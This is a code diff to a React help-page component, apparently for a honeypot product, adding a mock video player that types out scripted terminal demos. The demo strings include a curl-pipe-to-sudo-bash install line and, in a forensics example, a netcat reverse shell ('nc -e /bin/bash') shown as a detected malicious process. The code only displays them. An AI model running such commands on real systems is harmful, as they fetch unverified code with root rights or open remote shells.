@@ -1,5 +1,6 @@
-import React, { useState } from 'react';
-import { BookOpen, HelpCircle, Video, FileText, ChevronDown, ChevronUp, PlayCircle, ExternalLink, Zap, Shield, Terminal, LifeBuoy, ArrowLeft, CheckCircle, Clock, Play, Pause, Volume2, Maximize, SkipBack, SkipForward, Loader } from 'lucide-react';
+
+import React, { useState, useEffect, useRef } from 'react';
+import { BookOpen, HelpCircle, Video, FileText, ChevronDown, ChevronUp, PlayCircle, ExternalLink, Zap, Shield, Terminal, LifeBuoy, ArrowLeft, CheckCircle, Clock, Play, Pause, Volume2, Maximize, SkipBack, SkipForward, Loader, RefreshCw } from 'lucide-react';
 
 const TUTORIALS = [
     {
@@ -99,43 +100,228 @@ const FAQS = [
     }
 ];
 
+// Scripts for the simulated video player
+const SCRIPTS: Record<string, string[]> = {
+    "Quick Start: First Deployment": [
+        "admin@console:~$ curl -sL http://vpp.io/setup | sudo bash",
+        "[sudo] password for admin: ",
+        "[+] Downloading VPP Agent Installer...",
+        "[+] Verifying Integrity... OK",
+        "[+] Unpacking components...",
+        "[+] Initializing secure tunnel...",
+        "[+] Connecting to C2 Server...",
+        "root@host:~# vpp-agent --status",
+        "Agent Status: ONLINE",
+        "Gateway: CONNECTED",
+        "Waiting for adoption...",
+        "Device adopted successfully. Configuration sync complete."
+    ],
+    "Mastering Personas": [
+        "root@node-01:~# vpp-agent --status",
+        "Current Persona: Generic Linux",
+        "root@node-01:~# vpp-agent --set-persona 'HP Printer'",
+        "[+] Stopping network services...",
+        "[+] Spoofing MAC Address: 00:1B:78:2F:A1:C9",
+        "[+] Opening Port 9100 (JetDirect)...",
+        "[+] Opening Port 631 (IPP)...",
+        "[+] Updating Service Banners...",
+        "root@node-01:~# nmap -sV localhost",
+        "PORT     STATE SERVICE     VERSION",
+        "9100/tcp open  jetdirect   HP JetDirect 2.0",
+        "631/tcp  open  ipp         CUPS 2.2",
+        "Persona Switched Successfully."
+    ],
+    "Sentinel Mode & Lockdowns": [
+        "root@node-05:~# tail -f /var/log/vpp-agent.log",
+        "Monitoring traffic...",
+        "root@node-05:~# vpp-agent --sentinel on",
+        "[!] ACTIVATING PARANOID MODE [!]",
+        "[+] IPTables: LOG --tcp-flags SYN",
+        "[+] Alerting Level: CRITICAL",
+        "[SENTINEL] Listening for stealth scans...",
+        "[ALERT] INBOUND SYN from 192.168.1.55:44322 -> :80",
+        "[ALERT] INBOUND SYN from 192.168.1.55:44323 -> :443",
+        "[AUTO-DEFENSE] Flagging node as COMPROMISED."
+    ],
+    "Analyzing Forensic Snapshots": [
+        "root@node-02:~# vpp-agent --forensic --dump-mem",
+        "[+] Dumping volatile memory...",
+        "[+] Extracting network artifacts...",
+        "[+] Parsing process tree...",
+        "Found suspicious process: PID 4490 (nc)",
+        "Connection: 192.168.1.101:4444 -> 10.0.0.5:8888",
+        "[+] Snapshot saved: snap-20231025.json",
+        "root@node-02:~# grep '4490' snap-20231025.json",
+        "\"pid\": 4490, \"cmd\": \"nc -e /bin/bash 10.0.0.5 8888\""
+    ]
+};
+
 // --- MOCK VIDEO PLAYER COMPONENT ---
 const MockPlayer = ({ title }: { title: string }) => {
     const [isPlaying, setIsPlaying] = useState(false);
-    const [progress, setProgress] = useState(30);
+    const [progress, setProgress] = useState(0);
+    const [isBuffering, setIsBuffering] = useState(false);
+    const [terminalLines, setTerminalLines] = useState<string[]>([]);
+    
+    // Playback state refs
+    const intervalRef = useRef<number | null>(null);
+    const scriptIndexRef = useRef(0);
+    const charIndexRef = useRef(0);
+    const script = SCRIPTS[title] || SCRIPTS["Quick Start: First Deployment"];
+
+    const stopPlayback = () => {
+        if (intervalRef.current) clearInterval(intervalRef.current);
+        setIsPlaying(false);
+        setIsBuffering(false);
+    };
+
+    const startPlayback = () => {
+        setIsPlaying(true);
+        setIsBuffering(true);
+        
+        // Reset if at end
+        if (progress >= 100) {
+            setProgress(0);
+            setTerminalLines([]);
+            scriptIndexRef.current = 0;
+            charIndexRef.current = 0;
+        }
+
+        // Simulate buffer
+        setTimeout(() => {
+            setIsBuffering(false);
+            
+            // Start typing loop
+            intervalRef.current = window.setInterval(() => {
+                const currentLine = script[scriptIndexRef.current];
+                
+                if (!currentLine) {
+                    // End of script
+                    if (intervalRef.current) clearInterval(intervalRef.current);
+                    setIsPlaying(false);
+                    setProgress(100);
+                    return;
+                }
+
+                if (charIndexRef.current < currentLine.length) {
+                    // Typing current line
+                    const partial = currentLine.substring(0, charIndexRef.current + 1);
+                    setTerminalLines(prev => {
+                        const newLines = [...prev];
+                        if (newLines.length === 0 || charIndexRef.current === 0) newLines.push(partial);
+                        else newLines[newLines.length - 1] = partial;
+                        return newLines;
+                    });
+                    charIndexRef.current += 2; // Type speed
+                } else {
+                    // Line finished, pause briefly then move to next
+                    if (intervalRef.current) clearInterval(intervalRef.current);
+                    
+                    setTimeout(() => {
+                        scriptIndexRef.current++;
+                        charIndexRef.current = 0;
+                        if (scriptIndexRef.current < script.length) {
+                            startPlayback(); // Resume loop via recursion (simplifies logic)
+                        } else {
+                            setIsPlaying(false);
+                            setProgress(100);
+                        }
+                    }, 500); 
+                }
+                
+                // Update Progress bar roughly based on lines
+                setProgress((scriptIndexRef.current / script.length) * 100);
+
+            }, 50);
+        }, 1200);
+    };
+
+    // Cleanup
+    useEffect(() => {
+        return () => {
+            if (intervalRef.current) clearInterval(intervalRef.current);
+        };
+    }, []);
+
+    // Handle Title change reset
+    useEffect(() => {
+        stopPlayback();
+        setTerminalLines([]);
+        setProgress(0);
+        scriptIndexRef.current = 0;
+        charIndexRef.current = 0;
+    }, [title]);
+
+    const handleTogglePlay = () => {
+        if (isPlaying) stopPlayback();
+        else startPlayback();
+    };
 
     return (
         <div className="w-full aspect-video bg-black rounded-lg border border-slate-700 relative group overflow-hidden shadow-2xl flex flex-col">
             {/* Screen Content */}
-            <div className="flex-1 flex items-center justify-center bg-slate-900/50 relative">
-                <div className="absolute inset-0 bg-[url('https://www.transparenttextures.com/patterns/carbon-fibre.png')] opacity-20"></div>
-                {!isPlaying && (
-                    <button 
-                        onClick={() => setIsPlaying(true)}
-                        className="w-20 h-20 bg-blue-600/90 rounded-full flex items-center justify-center shadow-[0_0_30px_rgba(37,99,235,0.3)] hover:scale-110 transition-transform z-10"
-                    >
-                        <Play className="w-10 h-10 text-white ml-1.5" />
-                    </button>
-                )}
-                {isPlaying && (
-                    <div className="text-slate-500 font-mono text-sm animate-pulse flex flex-col items-center">
-                        <Loader className="w-10 h-10 mb-2 animate-spin text-blue-500" />
-                        <span>Loading Stream...</span>
+            <div className="flex-1 flex flex-col bg-slate-900/50 relative overflow-hidden">
+                <div className="absolute inset-0 bg-[url('https://www.transparenttextures.com/patterns/carbon-fibre.png')] opacity-20 pointer-events-none"></div>
+                
+                {/* Simulated Terminal Screen */}
+                {(isPlaying || progress > 0) && !isBuffering && (
+                    <div className="absolute inset-0 p-4 font-mono text-xs md:text-sm text-green-500 bg-black/90 overflow-y-auto">
+                        {terminalLines.map((line, i) => (
+                            <div key={i} className="mb-1 break-all">
+                                {line}
+                                {i === terminalLines.length - 1 && isPlaying && <span className="inline-block w-2 h-4 bg-green-500 animate-pulse ml-1 align-middle"></span>}
+                            </div>
+                        ))}
                     </div>
                 )}
-                <div className="absolute top-4 left-4 text-white font-bold text-lg drop-shadow-md bg-black/50 px-2 rounded">{title}</div>
+
+                {/* Scanline Effect */}
+                {isPlaying && <div className="absolute inset-0 bg-[linear-gradient(rgba(18,16,16,0)_50%,rgba(0,0,0,0.25)_50%),linear-gradient(90deg,rgba(255,0,0,0.06),rgba(0,255,0,0.02),rgba(0,0,255,0.06))] bg-[length:100%_4px,3px_100%] pointer-events-none animate-pulse"></div>}
+
+                {/* Loading / Start Overlay */}
+                {(!isPlaying && progress === 0) && (
+                    <div className="absolute inset-0 flex items-center justify-center bg-black/40 backdrop-blur-[1px]">
+                        <button 
+                            onClick={handleTogglePlay}
+                            className="w-20 h-20 bg-blue-600/90 rounded-full flex items-center justify-center shadow-[0_0_30px_rgba(37,99,235,0.3)] hover:scale-110 transition-transform z-10 group/play"
+                        >
+                            <Play className="w-10 h-10 text-white ml-1.5 group-hover/play:scale-110 transition-transform" />
+                        </button>
+                    </div>
+                )}
+
+                {/* Buffering Indicator */}
+                {isBuffering && (
+                    <div className="absolute inset-0 flex flex-col items-center justify-center bg-black/60 z-20">
+                        <Loader className="w-10 h-10 mb-2 animate-spin text-blue-500" />
+                        <span className="text-slate-400 font-mono text-xs tracking-widest animate-pulse">ESTABLISHING FEED...</span>
+                    </div>
+                )}
+
+                {/* Title Overlay */}
+                <div className="absolute top-4 left-4 text-white font-bold text-lg drop-shadow-md bg-black/50 px-3 py-1 rounded backdrop-blur-md border border-white/10 flex items-center">
+                    <Video className="w-4 h-4 mr-2 text-blue-400" />
+                    {title}
+                </div>
             </div>
 
             {/* Controls */}
-            <div className="h-12 bg-slate-800 border-t border-slate-700 flex items-center px-4 space-x-4 z-20">
-                <button onClick={() => setIsPlaying(!isPlaying)} className="text-slate-300 hover:text-white">
-                    {isPlaying ? <Pause className="w-5 h-5" /> : <Play className="w-5 h-5" />}
+            <div className="h-12 bg-slate-800 border-t border-slate-700 flex items-center px-4 space-x-4 z-20 select-none">
+                <button onClick={handleTogglePlay} className="text-slate-300 hover:text-white transition-colors">
+                    {isPlaying ? <Pause className="w-5 h-5" /> : (progress >= 100 ? <RefreshCw className="w-5 h-5" /> : <Play className="w-5 h-5" />)}
                 </button>
-                <div className="flex-1 h-1.5 bg-slate-600 rounded-full overflow-hidden cursor-pointer relative group/bar">
-                    <div className="absolute top-0 left-0 h-full bg-blue-500 w-[30%]"></div>
-                    <div className="absolute top-0 left-[30%] w-3 h-3 bg-white rounded-full -mt-0.5 opacity-0 group-hover/bar:opacity-100 shadow-lg"></div>
+                
+                {/* Progress Bar */}
+                <div className="flex-1 h-1.5 bg-slate-600 rounded-full overflow-hidden cursor-pointer relative group/bar" onClick={() => {}}>
+                    <div 
+                        className="absolute top-0 left-0 h-full bg-blue-500 transition-all duration-300"
+                        style={{ width: `${progress}%` }}
+                    ></div>
                 </div>
-                <span className="text-xs font-mono text-slate-400">01:42 / 05:00</span>
+                
+                <span className="text-xs font-mono text-slate-400">
+                    {Math.floor((progress / 100) * 5)}:{(Math.floor(((progress / 100) * 300) % 60)).toString().padStart(2, '0')} / 05:00
+                </span>
                 <Volume2 className="w-5 h-5 text-slate-400 hover:text-white cursor-pointer" />
                 <Maximize className="w-5 h-5 text-slate-400 hover:text-white cursor-pointer" />
             </div>
